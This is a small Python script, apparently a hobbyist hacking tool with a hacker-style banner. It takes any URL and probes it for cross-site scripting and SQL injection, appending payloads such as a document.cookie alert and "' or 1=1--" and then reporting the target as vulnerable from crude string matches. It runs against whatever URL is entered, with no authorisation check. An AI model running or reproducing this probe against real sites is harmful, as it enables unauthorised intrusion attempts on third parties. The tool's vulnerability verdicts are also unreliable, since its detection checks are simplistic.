import requests
import time
import os

os.system('clear')
def banner():
    print("")
    print('''
.▄▄ · ▐▄• ▄ .▄▄ · .▄▄ · 
▐█ ▀.  █▌█▌▪▐█ ▀. ▐█ ▀. 
▄▀▀▀█▄ ·██· ▄▀▀▀█▄▄▀▀▀█▄
▐█▄▪▐█▪▐█·█▌▐█▄▪▐█▐█▄▪▐█
 ▀▀▀▀ •▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀ 
 
   Copyright :Ph4mCh13n
 Twitter : @Anonym0us_VNPC''')
    print("")

banner()

url = input("URL : ")
print("")
time.sleep(2)
print("[*] Starting scanning for vulnerabilities")
time.sleep(3)
print("")

payloads_xss = [
	"<h1>this is site vulnerability XSS</h1>",
	"<script>alert('this is site vulnerability XSS')</script>",
	"<script>alert(document.cookie)</script>"
]

payloads_sql = [
	"%27",
	"%27 union select 1,2,3",
	"%27 or 1=1--",
]

for payload in payloads_xss:
    response = requests.get(url)
    if response.status_code == 200:
        scan_xss = requests.get(url + payload)
        if "this is site vulnerability XSS" in scan_xss.text:
            print("")
            print(f"[ XSS ] Target May Be vulnerabilities : {url + payload}")
        else:
            print("")
            print(f"[ XSS ] Target Not vulnerabilities : {url + payload}")

    else:
        print(f"[*] No Connected")

for payload in payloads_sql:
    response = requests.get(url)
    if response.status_code == 200:
        scan_sql = requests.get(url + payload)
        if "Warning: mysql_fetch_array()" in scan_sql.text:
            print("")
            print(f"[ SQLi ] Target May Be vulnerabilities : {url + payload}")
        elif "on line" in scan_sql.text:
            print("")
            print(f"[ SQLi ] Target May Be vulnerabilities : {url + payload}")
        else:
            print("")
            print(f"[ SQli ] Target Not vulnerabilities : {url + payload}")

    else:
        print(f"[*] No Connected")
